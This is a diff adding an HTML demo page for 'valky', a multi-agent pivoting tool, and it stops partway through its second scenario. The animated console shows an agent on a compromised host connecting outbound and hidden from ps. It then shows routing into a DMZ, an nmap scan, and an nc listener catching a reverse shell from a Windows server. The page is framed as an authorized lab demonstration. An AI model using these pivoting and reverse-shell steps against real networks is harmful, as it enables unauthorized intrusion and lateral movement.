@@ -1,0 +1,1084 @@
+<meta charset="utf-8">
+<title>Valky Pivot Demo</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<style>
+  /* Cyberpunk-2077 palette taken from valky's theme.go (truecolor ANSI).
+     Layout: scenario tabs → console (left) + horizontal topology (right); stacks on phone.
+     Single committed dark console world — all colors explicit. */
+  :root {
+    --bg:       #0d0f12;
+    --panel:    #14181d;
+    --panel-2:  #101317;
+    --line:     #262c34;
+    --fg:       #d9dde3;
+    --muted:    #7d8590;
+    --dim:      #343c46;
+    --c-yellow:  #e2cf4b;   /* muted Night City yellow */
+    --c-cyan:    #5fa7b3;   /* UNSC terminal cyan-gray */
+    --c-magenta: #c8473f;
+    --c-green:   #7fb069;
+    --c-gray:    #7d8590;
+    --c-blue:    #6f9bbf;
+    --mono: "JetBrains Mono", ui-monospace, "SF Mono", Menlo, Consolas, monospace;
+    --sans: "Rajdhani", "JetBrains Mono", system-ui, -apple-system, Segoe UI, sans-serif;
+    color-scheme: dark;
+  }
+  * { box-sizing: border-box; }
+  body {
+    background:
+      radial-gradient(1100px 600px at 82% -10%, rgba(95,167,179,.05), transparent 60%),
+      radial-gradient(900px 500px at 4% 110%, rgba(200,71,63,.04), transparent 55%),
+      linear-gradient(rgba(255,255,255,.018) 1px, transparent 1px) 0 0 / 32px 32px,
+      linear-gradient(90deg, rgba(255,255,255,.018) 1px, transparent 1px) 0 0 / 32px 32px,
+      var(--bg);
+    color: var(--fg); font-family: var(--sans); line-height: 1.5; margin: 0;
+  }
+  /* scanline overlay, like the main site */
+  body::before {
+    content: ""; position: fixed; inset: 0; pointer-events: none; z-index: 50;
+    background: repeating-linear-gradient(to bottom, rgba(0,0,0,.18) 0 1px, transparent 1px 3px);
+  }
+  @media (prefers-reduced-motion: reduce) { body::before { display: none; } }
+  .wrap {
+    max-width: 1200px; margin: 0 auto; padding-block: 24px 40px;
+    padding-left: max(16px, env(safe-area-inset-left, 0px));
+    padding-right: max(16px, env(safe-area-inset-right, 0px));
+  }
+  code { font-family: var(--mono); font-size: .9em; color: var(--c-cyan); }
+
+  header { display: flex; flex-wrap: wrap; align-items: baseline; gap: 8px 16px; margin-bottom: 14px; }
+  .brand { font-family: var(--mono); font-weight: 700; font-size: 25px; letter-spacing: 1px; color: var(--fg); }
+  .brand b { color: var(--c-yellow); } .brand .mg { color: var(--c-magenta); }
+  .brand .cursor { color: var(--c-cyan); animation: blink 1.1s steps(1) infinite; }
+  .tag { color: var(--muted); font-size: 14px; max-width: 62ch; }
+  .scope {
+    margin-left: auto; font-family: var(--mono); font-size: 10.5px; letter-spacing: .6px;
+    text-transform: uppercase; color: var(--c-yellow);
+    border: 1px solid rgba(226,207,75,.3); border-radius: 999px; padding: 4px 11px;
+    background: rgba(226,207,75,.06); white-space: nowrap;
+  }
+  @keyframes blink { 50% { opacity: 0; } }
+
+  .tabs { display: flex; gap: 8px; margin-bottom: 14px; flex-wrap: wrap; }
+  .tab {
+    font-family: var(--mono); font-size: 12.5px; color: var(--muted);
+    background: var(--panel-2); border: 1px solid var(--line);
+    clip-path: polygon(0 0, calc(100% - 8px) 0, 100% 8px, 100% 100%, 0 100%);
+    padding: 9px 16px; cursor: pointer; transition: .2s; border-bottom-width: 2px;
+  }
+  .tab:hover { color: var(--fg); }
+  .tab.on { color: var(--bg); font-weight: 600; }
+  .tab.on.tun { background: var(--c-green); border-color: var(--c-green); }
+  .tab.on.prx { background: var(--c-yellow); border-color: var(--c-yellow); }
+  .tab.on.cld { background: var(--c-cyan); border-color: var(--c-cyan); }
+  .tab.on.dl { background: var(--c-blue); border-color: var(--c-blue); }
+  .tab .k { font-size: 10px; display: block; opacity: .75; font-weight: 400; }
+
+  .grid { display: grid; grid-template-columns: minmax(0, 1.08fr) minmax(0, 1fr); gap: 16px; align-items: start; }
+  @media (max-width: 900px) { .grid { grid-template-columns: 1fr; } }
+
+  .card { background: linear-gradient(180deg, var(--panel), var(--panel-2)); border: 1px solid var(--line); clip-path: polygon(0 0, calc(100% - 14px) 0, 100% 14px, 100% 100%, 14px 100%, 0 calc(100% - 14px)); overflow: hidden; min-width: 0; }
+  .card-head { display: flex; align-items: center; gap: 9px; padding: 9px 13px; border-bottom: 1px solid var(--line); font-family: var(--mono); font-size: 11.5px; letter-spacing: .3px; color: var(--muted); }
+  .dots { display: flex; gap: 6px; }
+  .dots i { width: 10px; height: 10px; border-radius: 50%; display: block; }
+  .dots i:nth-child(1){ background:#ff5f56; } .dots i:nth-child(2){ background:#ffbd2e; } .dots i:nth-child(3){ background:#27c93f; }
+  .card-head .title { margin-left: 4px; } .card-head .meta { margin-left: auto; color: var(--dim); }
+
+  #term { font-family: var(--mono); font-size: 12px; line-height: 1.6; padding: 13px 14px; height: 510px; overflow-y: auto; white-space: pre; }
+  @media (max-width: 560px) { #term { white-space: pre-wrap; word-break: break-word; } }
+  #term .ln { display: block; min-height: 1.1em; }
+  .host { color: var(--c-magenta); font-weight: 600; } .sep { color: var(--c-cyan); }
+  .kb { color: var(--c-blue); } .kr { color: var(--c-green); font-weight: 600; } .kp { color: var(--c-cyan); }
+  .vu { color: var(--c-green); } .vp { color: var(--c-blue); } .shp { color: var(--muted); }
+  .cmd { color: var(--fg); }
+  .yellow { color: var(--c-yellow); } .cyan { color: var(--c-cyan); } .magenta { color: var(--c-magenta); }
+  .green { color: var(--c-green); } .blue { color: var(--c-blue); } .gray, .ts { color: var(--c-gray); }
+  .hdr { color: var(--c-yellow); font-weight: 600; } .b { font-weight: 600; }
+  .caret { background: var(--c-cyan); color: var(--bg); animation: blink 1.1s steps(1) infinite; }
+
+  .diagram-wrap { padding: 8px 6px 2px; }
+  svg { display: block; width: 100%; height: auto; }
+  .node-box { fill: var(--panel-2); stroke: var(--line); stroke-width: 1.4; transition: stroke .3s, filter .3s; }
+  .node.lit .node-box { stroke: var(--c-green); filter: drop-shadow(0 0 7px rgba(127,176,105,.5)); }
+  .node.lit.px .node-box { stroke: var(--c-yellow); filter: drop-shadow(0 0 7px rgba(226,207,75,.5)); }
+  .node.hit .node-box { stroke: var(--c-green); filter: drop-shadow(0 0 9px rgba(127,176,105,.78)); }
+  .node.drop .node-box { stroke: var(--c-magenta); filter: drop-shadow(0 0 9px rgba(200,71,63,.8)); }
+  .n-t { font-family: var(--mono); font-size: 12px; font-weight: 600; fill: var(--fg); }
+  .n-s { font-family: var(--mono); font-size: 9.5px; fill: var(--muted); }
+  .n-ip { font-family: var(--mono); font-size: 9.5px; fill: var(--c-green); }
+  .node.px .n-ip { fill: var(--c-yellow); }
+  .link { fill: none; stroke: var(--line); stroke-width: 2; transition: stroke .3s; }
+  .link.lit { stroke: rgba(127,176,105,.5); } .link.lit.px { stroke: rgba(226,207,75,.5); }
+  .link-label { font-family: var(--mono); font-size: 9px; fill: var(--dim); }
+  .drop-x { font-family: var(--mono); font-size: 22px; font-weight: 700; fill: var(--c-magenta); opacity: 0; }
+
+  .caption { min-height: 56px; margin: 2px 6px 8px; padding: 10px 12px; border-top: 1px dashed var(--line); font-size: 12.5px; color: var(--fg); font-family: var(--mono); line-height: 1.55; }
+  .caption b { color: var(--c-green); font-weight: 600; } .caption .y { color: var(--c-yellow); } .caption .r { color: var(--c-magenta); } .caption .c { color: var(--c-cyan); }
+
+  .controls { display: flex; align-items: center; gap: 9px; flex-wrap: wrap; margin-top: 15px; }
+  button.ctl { font-family: var(--mono); font-size: 12px; color: var(--fg); background: var(--panel-2); border: 1px solid var(--line); clip-path: polygon(0 0, calc(100% - 7px) 0, 100% 7px, 100% 100%, 0 100%); padding: 9px 14px; cursor: pointer; transition: .2s; }
+  button.ctl:hover { border-color: var(--c-cyan); color: var(--c-cyan); }
+  button.ctl:focus-visible { outline: 2px solid var(--c-cyan); outline-offset: 2px; }
+  button.ctl.primary { background: rgba(95,167,179,.1); border-color: rgba(95,167,179,.4); color: var(--c-cyan); }
+  button.ctl:disabled { opacity: .4; cursor: default; border-color: var(--line); color: var(--muted); }
+  .steps { display: flex; gap: 6px; margin-left: auto; align-items: center; flex-wrap: wrap; }
+  .steps .sd { width: 9px; height: 9px; border-radius: 50%; background: var(--dim); border: none; padding: 0; cursor: pointer; transition: .2s; }
+  .steps .sd:hover { transform: scale(1.25); } .steps .sd.on { background: var(--c-cyan); } .steps .sd.done { background: var(--c-green); }
+  .foot { margin-top: 18px; color: var(--dim); font-size: 11.5px; font-family: var(--mono); }
+  @media (prefers-reduced-motion: reduce) { .cursor, .caret { animation: none; } }
+
+  /* ---------- Downloads / releases ---------- */
+  #downloads { margin-top: 2px; }
+  .dl-head { display: flex; align-items: baseline; gap: 8px 16px; flex-wrap: wrap; font-family: var(--mono); font-size: 12.5px; color: var(--muted); margin-bottom: 14px; }
+  .dl-head .repo { color: var(--c-yellow); }
+  .dl-head .meta { margin-left: auto; color: var(--dim); }
+  .dl-status { font-family: var(--mono); font-size: 12.5px; color: var(--muted); padding: 20px 2px; }
+  .dl-status.err { color: var(--c-magenta); }
+  .rel {
+    background: linear-gradient(180deg, var(--panel), var(--panel-2)); border: 1px solid var(--line);
+    clip-path: polygon(0 0, calc(100% - 14px) 0, 100% 14px, 100% 100%, 14px 100%, 0 calc(100% - 14px));
+    padding: 14px 16px; margin-bottom: 12px;
+  }
+  .rel-top { display: flex; align-items: baseline; gap: 10px; flex-wrap: wrap; }
+  .rel-top h3 { margin: 0; font-family: var(--sans); font-weight: 600; font-size: 18px; letter-spacing: .5px; color: var(--fg); word-break: break-word; }
+  .rel-tag { font-family: var(--mono); font-size: 11px; color: var(--bg); background: var(--c-yellow); padding: 1px 8px; white-space: nowrap; }
+  .rel-tag.pre { background: var(--c-magenta); color: var(--fg); }
+  .rel-date { margin-left: auto; font-family: var(--mono); font-size: 11px; color: var(--muted); }
+  .assets { list-style: none; margin: 12px 0 0; padding: 0; display: flex; flex-direction: column; gap: 6px; }
+  .asset { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; font-family: var(--mono); font-size: 12px; background: var(--panel-2); border: 1px solid var(--line); padding: 7px 11px; }
+  .asset a { color: var(--c-cyan); text-decoration: none; min-width: 0; word-break: break-all; }
+  .asset a:hover { text-decoration: underline; }
+  .asset .sz { color: var(--muted); } .asset .dc { margin-left: auto; color: var(--dim); white-space: nowrap; }
+  .rel-src { margin-top: 10px; font-family: var(--mono); font-size: 11.5px; }
+  .rel-src a { color: var(--c-cyan); }
+</style>
+
+<div class="wrap">
+  <header>
+    <div class="brand"><span class="mg">valky</span><span class="sep">❯</span> pivot demo<span class="cursor">▋</span></div>
+    <p class="tag">Multi-agent L3 pivoting. Tunnel and proxy modes shown as separate scenarios.</p>
+    <span class="scope">lab · authorized use</span>
+  </header>
+
+  <div class="tabs" role="tablist">
+    <button class="tab tun on" id="tab-tun" role="tab"><span>Tunnel mode</span><span class="k">root agent · TUN · raw L3 + revshell</span></button>
+    <button class="tab prx" id="tab-prx" role="tab"><span>Proxy mode</span><span class="k">no-root agent · userspace L3 egress</span></button>
+    <button class="tab cld" id="tab-cld" role="tab"><span>Cloud relay</span><span class="k">home NAT → EC2 hub → corp firewall</span></button>
+    <button class="tab dl" id="tab-dl" role="tab"><span>Downloads</span><span class="k">releases · github api</span></button>
+  </div>
+
+  <div class="grid">
+    <section class="card">
+      <div class="card-head">
+        <span class="dots"><i></i><i></i><i></i></span>
+        <span class="title">valky server console</span>
+        <span class="meta">v1.1.0</span>
+      </div>
+      <div id="term" aria-live="polite"></div>
+    </section>
+
+    <section class="card">
+      <div class="card-head">
+        <span class="title">overlay 10.9.0.0/24 — live path</span>
+        <span class="meta" id="mode-label">idle…</span>
+      </div>
+      <div class="diagram-wrap">
+        <svg viewBox="0 0 980 190" role="img" aria-label="Valky pivot topology">
+          <path id="pA" class="link" d="M186,95 L300,95"></path>
+          <path id="pB" class="link" d="M454,95 L556,95"></path>
+          <path id="pC" class="link" d="M716,95 L812,95"></path>
+          <text class="link-label" x="210" y="86">reverse :9000</text>
+          <text class="link-label" x="470" y="86" id="lbl-bc">overlay</text>
+          <text class="link-label" x="730" y="86" id="lbl-cd">LAN</text>
+
+          <g id="packets"></g>
+
+          <g class="node" id="n-kali" transform="translate(36,62)">
+            <rect class="node-box" width="150" height="66" rx="10"></rect>
+            <text class="n-t"  x="13" y="25" id="n-kali-t">kali</text>
+            <text class="n-s"  x="13" y="42" id="n-kali-s">operator</text>
+            <text class="n-ip" x="13" y="57" id="n-kali-ip">10.9.0.1</text>
+          </g>
+          <g class="node" id="n-srv" transform="translate(300,62)">
+            <rect class="node-box" width="154" height="66" rx="10"></rect>
+            <text class="n-t"  x="13" y="25" id="n-srv-t">valky server</text>
+            <text class="n-s"  x="13" y="42" id="n-srv-s">hub · daemon</text>
+            <text class="n-ip" x="13" y="57" id="n-srv-ip">0.0.0.0:9000</text>
+          </g>
+          <g class="node" id="n-pivot" transform="translate(556,62)">
+            <rect class="node-box" width="160" height="66" rx="10"></rect>
+            <text class="n-t"  x="13" y="25" id="n-pivot-t">pivot</text>
+            <text class="n-s"  x="13" y="42" id="n-pivot-s">agent</text>
+            <text class="n-ip" x="13" y="57" id="n-pivot-ip">10.9.0.2</text>
+          </g>
+          <g class="node" id="n-tgt" transform="translate(812,62)">
+            <rect class="node-box" width="132" height="66" rx="10"></rect>
+            <text class="n-t"  x="13" y="25" id="n-tgt-t">target</text>
+            <text class="n-s"  x="13" y="42" id="n-tgt-s">LAN host</text>
+            <text class="n-ip" x="13" y="57" id="n-tgt-ip">—</text>
+          </g>
+          <text class="drop-x" id="dropx" x="0" y="0">✕</text>
+        </svg>
+      </div>
+      <div class="caption" id="caption">Pick a scenario and hit <b>▶ Play</b>.</div>
+    </section>
+  </div>
+
+  <section id="downloads" hidden aria-label="Downloads">
+    <div class="dl-head">
+      <span>$ gh release list --repo <span class="repo" id="dl-repo">—</span></span>
+      <span class="meta" id="dl-count"></span>
+    </div>
+    <div id="dl-list"></div>
+  </section>
+
+  <div class="controls">
+    <button class="ctl primary" id="play">▶ Play</button>
+    <button class="ctl" id="prev" disabled>◀ Back</button>
+    <button class="ctl" id="next">Next ▶</button>
+    <button class="ctl" id="restart">⟲ Restart</button>
+    <button class="ctl" id="speed">⏱ Speed: Slow</button>
+    <div class="steps" id="steps" aria-hidden="true"></div>
+  </div>
+
+  <p class="foot">Lab scenario · credentials/keys masked · any testing against client assets requires written authorization and a defined scope.</p>
+</div>
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Rajdhani:wght@500;600;700&display=swap">
+
+<script>
+(function () {
+  "use strict";
+  // Repo whose releases the "Downloads" tab lists. Change it to "owner/repo"
+  // when the repository is public (the API returns 404 while it is private).
+  var RELEASES_REPO = "SP34RH3AD/valky";
+  var reduce = window.matchMedia && window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+
+  // ---------- speed / timing ----------
+  var SPEEDS = [{ n: "Slow", f: 1 }, { n: "Medium", f: 1.9 }, { n: "Fast", f: 3.2 }];
+  var spi = 0;
+  function spd() { return SPEEDS[spi].f; }
+  function d(ms) { return reduce ? Math.min(ms, 50) : Math.round(ms / spd()); }
+  var T_TYPE = 46, T_AFTERCMD = 700, T_LINE = 560, T_STEP = 1600, T_REPLY = 520, T_PKT = 1500;
+
+  // ---------- console chunk builders ----------
+  function L() { return Array.prototype.slice.call(arguments); }
+  function seg(cls, text) { return [cls, text]; }
+  function padEnd(s, w) { s = String(s); return s.length >= w ? s : s + " ".repeat(w - s.length); }
+
+  var bannerChunk = { banner: true };
+  function bannerHTML() {
+    var box = "══════════════════════════════════════════════════";
+    var h = "";
+    h += '<span class="ln"><span class="cyan">╔' + box + '╗</span></span>';
+    h += '<span class="ln"><span class="cyan">║  </span><span class="hdr">V A L K Y</span><span class="cyan">  ::  mesh control  ::  </span><span class="magenta">night city</span><span class="cyan">   ║</span></span>';
+    h += '<span class="ln"><span class="cyan">╚' + box + '╝</span></span>';
+    h += '<span class="ln"><span class="gray">control 127.0.0.1:47655  ·  v1.1.0</span></span>';
+    h += '<span class="ln"><span class="gray">Tab = autocomplete   ↑/↓ = history   \'help\' = commands   \'detach\' = leave running</span></span>';
+    return h;
+  }
+  function tableHTML(headers, rows) {
+    var n = headers.length, w = [];
+    for (var i = 0; i < n; i++) w[i] = headers[i].length;
+    rows.forEach(function (r) { for (var i = 0; i < n; i++) { var t = (r[i] && r[i][1]) || ""; if (t.length > w[i]) w[i] = t.length; } });
+    var h = '<span class="ln">';
+    for (var i = 0; i < n; i++) h += '<span class="hdr">' + esc(padEnd(headers[i], w[i])) + '</span>' + (i < n - 1 ? "  " : "");
+    h += '</span><span class="ln">';
+    for (var i = 0; i < n; i++) h += '<span class="magenta">' + "─".repeat(w[i]) + '</span>' + (i < n - 1 ? "  " : "");
+    h += '</span>';
+    rows.forEach(function (r) {
+      h += '<span class="ln">';
+      for (var i = 0; i < n; i++) { var c = r[i] || ["", ""]; h += '<span class="' + c[0] + '">' + esc(padEnd(c[1], w[i])) + '</span>' + (i < n - 1 ? "  " : ""); }
+      h += '</span>';
+    });
+    return h;
+  }
+  var TS = "2026/10/25 ";
+  function clog(t, msg, cls) { return L(seg("ts", TS + t + " "), seg(cls || "gray", msg)); }
+
+  // ===================================================================
+  //  SCENARIO: TUNNEL (admin) — raw L3 + reverse shell catch
+  // ===================================================================
+  var tunnel = {
+    nodes: {
+      kali:  { t: "kali (operator)", s: "server+client · 172.16.71.10", ip: "overlay 10.9.0.1", px: false },
+      srv:   { t: "valky server", s: "hub · daemon", ip: "0.0.0.0:9000", px: false },
+      pivot: { t: "pivot-dmz (svc)", s: "client · tunnel (root)", ip: "10.9.0.2", px: false },
+      tgt:   { t: "win-srv", s: "DMZ host", ip: "192.168.56.10", px: false }
+    },
+    labels: { bc: "overlay / TUN", cd: "192.168.56.0/24" },
+    steps: [
+      {
+        prompt: "kali", cmd: "sudo ./valky server --config config.ini",
+        out: [ bannerChunk ],
+        nodes: ["n-srv"], mode: "server up",
+        caption: "The <b>server</b> starts as a daemon and attaches the console. <code>detach</code> leaves it running without dropping sessions."
+      },
+      {
+        prompt: "kali", cmd: "sudo ./valky client --ip 127.0.0.1 --port 9000 --passwd ****",
+        out: [
+          clog("14:01:02", "agent UUID: 5e2a…1f00"),
+          clog("14:01:02", "authenticated; assigned overlay address: 10.9.0.1"),
+          clog("14:01:02", "TUN interface valky0"),
+          clog("14:01:02", "link established (encrypted); waiting for rules from the server...")
+        ],
+        nodes: ["n-srv", "n-kali"], flow: { seq: ["pA"], dir: "rev", color: "var(--c-green)" },
+        mode: "operator TUN",
+        caption: "The operator runs its own <b>client in tunnel mode</b>: that creates the <code>valky0</code> interface (10.9.0.1), kali's raw-L3 ingress."
+      },
+      {
+        prompt: "victim", cmd: "sudo ./valky client --ip 172.16.71.10 --port 9000 --passwd **** --name svc --bg",
+        out: [
+          clog("14:02:40", "agent UUID: 3f1c…abcd"),
+          clog("14:02:40", "advertised local segments: 192.168.56.0/24"),
+          clog("14:02:40", "authenticated; assigned overlay address: 10.9.0.2"),
+          clog("14:02:40", "TUN interface valky0"),
+          clog("14:02:40", "link established (encrypted); waiting for rules from the server..."),
+          L(seg("gray", "valky client running in the background (control 127.0.0.1:47656)"))
+        ],
+        nodes: ["n-srv", "n-pivot"], flow: { seq: ["pB"], dir: "rev", color: "var(--c-green)" },
+        mode: "agent ▸ reverse",
+        caption: "The compromised host connects <b>outbound</b> (bypasses the firewall), tunnel mode with root, hidden in <code>ps</code> via <code>--name</code>. <b>svc advertises only 192.168.56.0/24</b> — that is already its delivery."
+      },
+      {
+        prompt: "valky", cmd: "ls",
+        out: [ { table: {
+          headers: ["AGENT-UUID", "NAME", "MODE", "OVERLAY", "REMOTE", "SEGMENTS", "INTERFACES"],
+          rows: [
+            [["cyan","5e2a…1f00"],["gray","-"],["green","tunnel"],["green","10.9.0.1"],["gray","local"],["yellow","172.16.71.0/24"],["green","172.16.71.10"]],
+            [["cyan","3f1c…abcd"],["gray","-"],["green","tunnel"],["green","10.9.0.2"],["gray","192.168.56.50:51022"],["yellow","192.168.56.0/24"],["green","192.168.56.50"]]
+          ]
+        } } ],
+        nodes: ["n-srv", "n-kali", "n-pivot"], mode: "2 agents",
+        caption: "Real <code>ls</code>: the <b>NAME</b> column starts as <code>-</code>. Agent <code>3f1c</code> <b>already delivers</b> 192.168.56.0/24 (auto-advertised); what is missing is authorizing the <b>source</b>."
+      },
+      {
+        prompt: "valky", cmd: "name 5e2a kali",
+        out: [ L(seg("green", "name set: "), seg("cyan", "5e2a…1f00"), seg("gray", " -> "), seg("yellow", "kali")) ],
+        nodes: ["n-srv", "n-kali"], mode: "name agent",
+        caption: "<code>name &lt;agent-uuid&gt; kali</code> assigns the alias, keyed by the stable UUID (survives reconnects and restarts)."
+      },
+      {
+        prompt: "valky", cmd: "name 3f1c svc",
+        out: [ L(seg("green", "name set: "), seg("cyan", "3f1c…abcd"), seg("gray", " -> "), seg("yellow", "svc")) ],
+        nodes: ["n-srv", "n-pivot"], mode: "name agent",
+        caption: "Same for the DMZ agent. Aliases work anywhere <code>--id</code> is used, so now we can refer to <code>kali</code> and <code>svc</code>."
+      },
+      {
+        prompt: "valky", cmd: "detach",
+        out: [ L(seg("gray", "console detached; server still running  ('valky --resume' to reattach)")) ],
+        nodes: ["n-srv", "n-kali", "n-pivot"], mode: "console ▸ bg",
+        caption: "To run OS tools you <b>leave the console</b> with <code>detach</code>/<code>bg</code>: the daemon keeps running in the background."
+      },
+      {
+        prompt: "kali", cmd: "ping -c 2 192.168.56.10",
+        out: [
+          L(seg("gray", "PING 192.168.56.10 (192.168.56.10) 56(84) bytes of data.")),
+          L(seg("magenta", "From 10.9.0.1 icmp_seq=1 Destination Host Unreachable")),
+          L(seg("magenta", "--- 192.168.56.10 ping statistics ---")),
+          L(seg("magenta", "2 packets transmitted, 0 received, 100% packet loss"))
+        ],
+        nodes: ["n-kali", "n-srv"], flow: { seq: ["pA"], color: "var(--c-green)", drop: "n-srv" },
+        mode: "test ▸ DROP",
+        caption: "<span class=\"r\">BEFORE</span>: no rule authorizes kali as a source → the server does an <b>ACL-drop</b>. 100% packet loss."
+      },
+      {
+        prompt: "kali", cmd: "valky --resume",
+        out: [ bannerChunk ],
+        nodes: ["n-srv", "n-kali", "n-pivot"], mode: "console ▸ resume",
+        caption: "<code>valky --resume</code> re-attaches the console to the daemon that kept running."
+      },
+      {
+        prompt: "valky", cmd: "route --add 192.168.56.0/24 --id kali",
+        out: [
+          L(seg("green", "rule created: "), seg("magenta", "8d9fd4d8-918b-4dfd-8bca-7bcd84de37ad")),
+          L(seg("gray", "  agent "), seg("cyan", "5e2a…1f00"), seg("gray", " can reach "), seg("yellow", "192.168.56.0/24"), seg("gray", " (online)")),
+          L(seg("blue", "  egress NAT on (default): the delivering agent (svc) masquerades so LAN hosts can reply"))
+        ],
+        nodes: ["n-srv", "n-kali", "n-pivot"], flow: { seq: ["pA", "pB"], color: "var(--c-green)" },
+        mode: "route --add --id kali",
+        caption: "The permission goes to the <b>source</b>: <code>route --add 192.168.56.0/24 --id <span class=\"c\">kali</span></code>. svc was already the delivery; kali is who now gets ACL to enter."
+      },
+      {
+        prompt: "valky", cmd: "route --list",
+        out: [ { table: {
+          headers: ["ROUTE-UUID", "AGENT-UUID", "NAME", "NETWORK", "LB", "NAT", "AGENT"],
+          rows: [
+            [["magenta","8d9fd4d8…"],["cyan","5e2a…1f00"],["yellow","kali"],["yellow","192.168.56.0/24"],["blue","-"],["green","yes"],["green","online"]]
+          ]
+        } } ],
+        nodes: ["n-srv", "n-kali"], mode: "route --list",
+        caption: "The rule belongs to <b>kali</b> (the source). Remove it with <code>route --del &lt;route-uuid&gt;</code> (a prefix is enough)."
+      },
+      {
+        prompt: "valky", cmd: "detach",
+        out: [ L(seg("gray", "console detached; server still running")) ],
+        nodes: ["n-srv", "n-kali", "n-pivot"], mode: "console ▸ bg",
+        caption: "Back to the shell to repeat the connectivity test, now <b>with</b> the rule in place."
+      },
+      {
+        prompt: "kali", cmd: "ping -c 2 192.168.56.10",
+        out: [
+          L(seg("gray", "PING 192.168.56.10 (192.168.56.10) 56(84) bytes of data.")),
+          L(seg("green", "64 bytes from 192.168.56.10: icmp_seq=1 ttl=127 time=8.41 ms")),
+          L(seg("green", "64 bytes from 192.168.56.10: icmp_seq=2 ttl=127 time=7.92 ms")),
+          L(seg("green", "2 packets transmitted, 2 received, 0% packet loss"))
+        ],
+        nodes: ["n-kali", "n-srv", "n-pivot"], hit: "n-tgt",
+        flow: { seq: ["pA", "pB", "pC"], color: "var(--c-green)", reply: true },
+        mode: "test ▸ OK",
+        caption: "<span class=\"y\">AFTER</span>: the <b>native ping</b> replies through the tunnel. Raw ICMP flows: <b>kali → server → svc → win-srv</b> and back."
+      },
+      {
+        prompt: "kali", cmd: "nmap -sV -Pn 192.168.56.10",
+        out: [
+          L(seg("gray", "# NATIVE over valky0 — no proxychains")),
+          L(seg("gray", "PORT     STATE  SERVICE  VERSION")),
+          L(seg("green", "445/tcp  open   smb      Windows Server 2019")),
+          L(seg("green", "3389/tcp open   ms-wbt   Microsoft Terminal Services"))
+        ],
+        nodes: ["n-kali", "n-srv", "n-pivot"], hit: "n-tgt",
+        flow: { seq: ["pA", "pB", "pC"], color: "var(--c-green)" },
+        mode: "L3 raw ▸ nmap",
+        caption: "Native tools straight at the DMZ. Now let's set up a <b>reverse shell</b> from win-srv back to kali."
+      },
+      {
+        prompt: "valky", cmd: "valky --resume",
+        out: [ bannerChunk ],
+        nodes: ["n-srv", "n-kali", "n-pivot"], mode: "console ▸ resume",
+        caption: "Re-attach to configure the port-forward that will bring the shell back through the pivot."
+      },
+      {
+        prompt: "valky", cmd: "forward --add --id svc --to 172.16.71.10:1234",
+        out: [
+          L(seg("green", "port-forward created: "), seg("magenta", "a9f3c0d1-7e22-4b88-9a0e-3c1b2d4e5f60")),
+          L(seg("gray", "  agent "), seg("cyan", "3f1c…abcd"), seg("gray", ": "), seg("cyan", "0.0.0.0:1234"), seg("gray", " -> "), seg("yellow", "172.16.71.10:1234"), seg("gray", " (forward active on agent)")),
+          L(seg("gray", "  listening on all interfaces; to pin one use --listen <ip>:1234 from: "), seg("green", "192.168.56.50")),
+          L(seg("gray", "  delivery: target reached through agent "), seg("cyan", "5e2a…1f00"), seg("gray", " (kali owns 172.16.71.0/24). forward auto-authorizes svc -> 172.16.71.10"))
+        ],
+        nodes: ["n-srv", "n-pivot", "n-kali"], flow: { seq: ["pB", "pA"], color: "var(--c-green)" },
+        mode: "forward ▸ revshell catcher",
+        caption: "No <code>--listen</code>: it defaults to <code>0.0.0.0:1234</code> (the <code>--to</code> port). svc forwards through the tunnel to <code>172.16.71.10:1234</code>, kali's <b>real IP</b>. This is the revshell <b>catcher</b>."
+      },
+      {
+        prompt: "valky", cmd: "detach",
+        out: [ L(seg("gray", "console detached; server still running")) ],
+        nodes: ["n-srv", "n-kali", "n-pivot"], mode: "console ▸ bg",
+        caption: "Back to kali's shell to start the reverse-shell listener."
+      },
+      {
+        prompt: "kali", cmd: "nc -nlvp 1234",
+        out: [ L(seg("gray", "listening on [any] 1234 ...")) ],
+        nodes: ["n-kali"], mode: "nc ▸ listening",
+        caption: "kali runs <code>nc -nlvp 1234</code>. On win-srv the payload connects to <b>svc:1234</b> (its own network) — it never needs to see kali."
+      },
+      {
+        prompt: null, cmd: null,
+        out: [
+          L(seg("green", "connect to [172.16.71.10] from (UNKNOWN) [192.168.56.10] 49531")),
+          L(seg("gray", "Microsoft Windows [Version 10.0.17763.5329]")),
+          L(seg("gray", "(c) Microsoft Corporation. All rights reserved.")),
+          L(seg("cyan", "C:\\Users\\svc> whoami")),
+          L(seg("green", "win-srv\\svc"))
+        ],
+        nodes: ["n-tgt", "n-pivot", "n-srv"], hit: "n-kali",
+        flow: { seq: ["pC", "pB", "pA"], dir: "rev", color: "var(--c-green)" },
+        mode: "revshell ▸ caught",
+        caption: "The shell travels <b>win-srv → svc → server → kali</b> over the forward and lands in <code>nc</code>. <b>Reverse shell through the pivot. ✓</b>"
+      },
+      {
+        prompt: null, cmd: null,
+        out: [ L(seg("green", "[✓] tunnel complete — raw L3 (ping/nmap) + reverse shell chained through the pivot")) ],
+        nodes: ["n-kali", "n-srv", "n-pivot"], hit: "n-tgt", mode: "pivot ready",
+        caption: "Tunnel mode done. Try the <span class=\"y\">Proxy mode</span> tab for the unprivileged-agent case."
+      }
+    ]
+  };
+
+  // ===================================================================
+  //  SCENARIO: PROXY (no-admin) — tunnel ingress x proxy egress (userspace L3)
+  // ===================================================================
+  var proxy = {
+    nodes: {
+      kali:  { t: "kali (operator)", s: "server+client · 172.16.71.10", ip: "overlay 10.9.0.1", px: false },
+      srv:   { t: "valky server", s: "hub · daemon", ip: "0.0.0.0:9000", px: false },
+      pivot: { t: "pivot-app", s: "client · proxy (no-admin)", ip: "10.9.0.3", px: true },
+      tgt:   { t: "db-01", s: "behind pivot-app", ip: "30.30.30.5", px: false }
+    },
+    labels: { bc: "overlay / TUN", cd: "30.30.30.0/24" },
+    steps: [
+      {
+        prompt: "victim", cmd: "./valky client --ip 172.16.71.10 --port 9000 --passwd ****",
+        out: [
+          clog("15:10:08", "agent UUID: 9a77…ef02"),
+          clog("15:10:08", "advertised local segments: 10.10.20.0/24"),
+          clog("15:10:08", "no tunnel (proxy mode): operation not permitted", "magenta"),
+          clog("15:10:08", "run as administrator/root for a native L3 tunnel; proxy mode still routes L3 in userspace"),
+          clog("15:10:08", "userspace L3 egress ready (proxy mode)", "green"),
+          clog("15:10:08", "authenticated; assigned overlay address: 10.9.0.3"),
+          clog("15:10:08", "link established (encrypted); waiting for rules from the server...")
+        ],
